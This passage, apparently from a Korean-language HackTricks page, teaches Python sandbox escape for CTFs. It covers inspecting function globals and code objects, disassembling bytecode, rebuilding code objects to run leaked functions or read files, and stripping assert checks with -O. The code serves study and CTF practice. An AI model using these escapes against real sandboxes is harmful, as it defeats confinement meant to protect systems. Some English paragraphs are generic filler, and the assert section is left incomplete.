['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
```

위의 예시에서는 문자열 객체인 "hello"의 속성과 메서드의 이름을 나열하였습니다.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__`와 `func_globals`(동일)은 전역 환경을 가져옵니다. 예제에서는 몇 가지 가져온 모듈, 일부 전역 변수 및 그들의 선언된 내용을 볼 수 있습니다:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**여기에서 전역 변수를 얻을 수 있는 더 많은 장소를 확인하세요**](./#globals-and-locals)

### **함수 코드에 접근하기**

**`__code__`**와 `func_code`: 함수의 이 **속성**에 **접근하여 함수의 코드 객체를 얻을 수 있습니다**.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### 코드 정보 가져오기

To bypass Python sandboxes, it is important to gather as much information about the code being executed as possible. This information can help in identifying vulnerabilities and finding ways to exploit them.

#### 1. Inspecting the code

The first step is to inspect the code that is being executed. This can be done by reading the source code or decompiling the bytecode. By understanding how the code works, it becomes easier to identify potential weaknesses.

#### 2. Analyzing imports

Analyzing the imports used by the code can provide valuable insights. It can reveal the libraries and modules being used, which may have known vulnerabilities or weaknesses. Additionally, it can help in understanding the functionality and purpose of the code.

#### 3. Identifying external dependencies

Identifying any external dependencies used by the code is crucial. These dependencies can include external libraries, APIs, or services. By understanding the dependencies, it becomes possible to explore potential vulnerabilities in these components.

#### 4. Examining function calls

Examining the function calls within the code can provide useful information. It can reveal the interactions between different parts of the code and help in identifying potential security flaws. Pay attention to any user-controlled inputs that are passed as arguments to functions.

#### 5. Reviewing error messages

Error messages can sometimes leak sensitive information about the code or the underlying system. Reviewing error messages can help in identifying potential vulnerabilities or misconfigurations that can be exploited.

#### 6. Monitoring system calls

Monitoring system calls made by the code can provide insights into its behavior. This can help in identifying any suspicious or malicious activities. Tools like `strace` or `sysdig` can be used to monitor system calls.

By gathering and analyzing code information, it becomes easier to understand the code's behavior and identify potential vulnerabilities. This knowledge can then be used to bypass Python sandboxes effectively.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **함수 디어셈블하기**

To bypass Python sandboxes, it is often necessary to understand how the sandboxing mechanisms work. One way to do this is by disassembling the target function to analyze its bytecode instructions.

Python provides the `dis` module, which allows us to disassemble Python bytecode. By disassembling a function, we can see the individual bytecode instructions that make up the function.

To disassemble a function, we can use the `dis.dis()` function from the `dis` module. This function takes the function object as an argument and prints out the disassembled bytecode instructions.

Here is an example of how to disassemble a function:

```python
import dis

def target_function():
    x = 1
    y = 2
    z = x + y
    print(z)

dis.dis(target_function)
```

The output of the `dis.dis()` function will show the bytecode instructions of the `target_function`. By analyzing these instructions, we can gain insights into how the function works and potentially find ways to bypass the sandboxing mechanisms.

Keep in mind that disassembling a function is just one step in the process of bypassing Python sandboxes. It is important to have a good understanding of Python bytecode and the sandboxing mechanisms in order to effectively analyze and bypass the sandboxes.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
**주의**: **파이썬 샌드박스에서 `dis`를 가져올 수 없는 경우** 함수의 **바이트 코드**(`get_flag.func_code.co_code`)를 얻고 로컬에서 **분해**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)을 볼 수는 없지만, 로드되는 변수의 오프셋을 알 수 있기 때문에 (`get_flag.func_code.co_consts`)에서 추측할 수 있습니다.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Python 컴파일하기

이제, 실행할 수 없는 함수에 대한 정보를 덤프할 수 있다고 상상해 봅시다. 그러나 여전히 그 함수를 실행해야 하는 경우입니다.\
다음 예시와 같이, 해당 함수의 코드 객체에 접근할 수 있지만, 어떻게 플래그를 계산하는지 알 수 없습니다. (_더 복잡한 `calc_flag` 함수를 상상해보세요_)
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### 코드 객체 생성

먼저, **코드 객체를 생성하고 실행하는 방법**을 알아야 합니다. 이렇게 하면 우리가 노출된 함수를 실행할 수 있는 코드 객체를 생성할 수 있습니다.
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
파이썬 버전에 따라 `code_type`의 **매개변수**의 **순서가 다를 수 있습니다**. 실행 중인 파이썬 버전에서 매개변수의 순서를 알기 위한 가장 좋은 방법은 다음을 실행하는 것입니다:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### 유출된 함수 재구성

{% hint style="warning" %}
다음 예제에서는 함수 코드 객체에서 함수를 재구성하기 위해 필요한 모든 데이터를 가져옵니다. 실제 예제에서는 함수를 실행하기 위해 **`code_type`** 값을 유출해야 합니다.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### 방어 우회

이 포스트의 시작 부분에서 이전 예제에서는 `compile` 함수를 사용하여 **어떤 파이썬 코드든 실행하는 방법**을 볼 수 있습니다. 이는 **루프와 함께 전체 스크립트를 실행**할 수 있기 때문에 흥미로운 점입니다. (또한 **`exec`**를 사용하여 동일한 작업을 수행할 수도 있습니다).\
그래도 때로는 로컬 머신에서 **컴파일된 객체**를 생성하고 **CTF 머신**에서 실행하는 것이 유용할 수 있습니다 (예를 들어 CTF에서 `compiled` 함수를 사용할 수 없는 경우).

예를 들어, _./poc.py_를 읽는 함수를 수동으로 컴파일하고 실행해 봅시다:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
만약 `eval` 또는 `exec`에 접근할 수 없다면, **적절한 함수**를 생성할 수 있습니다. 그러나 이 함수를 직접 호출하면 일반적으로 **제한된 모드에서 접근할 수 없는 생성자 오류**가 발생합니다. 따라서 이 함수를 호출하기 위해서는 **제한된 환경이 아닌 함수에서 이 함수를 호출해야 합니다.**
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## 컴파일된 파이썬의 디컴파일

[**https://www.decompiler.com/**](https://www.decompiler.com)과 같은 도구를 사용하여 컴파일된 파이썬 코드를 **디컴파일** 할 수 있습니다.

**다음 튜토리얼을 확인하세요**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## 기타 파이썬

### Assert

파이썬은 `-O` 매개변수로 최적화하여 실행하면 어설트 문을 제거하고 **debug** 값에 따라 조건부로 실행되는 코드를 제거합니다.\
따라서, 다음과 같은 체크는
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## 참고 자료

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 표면을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
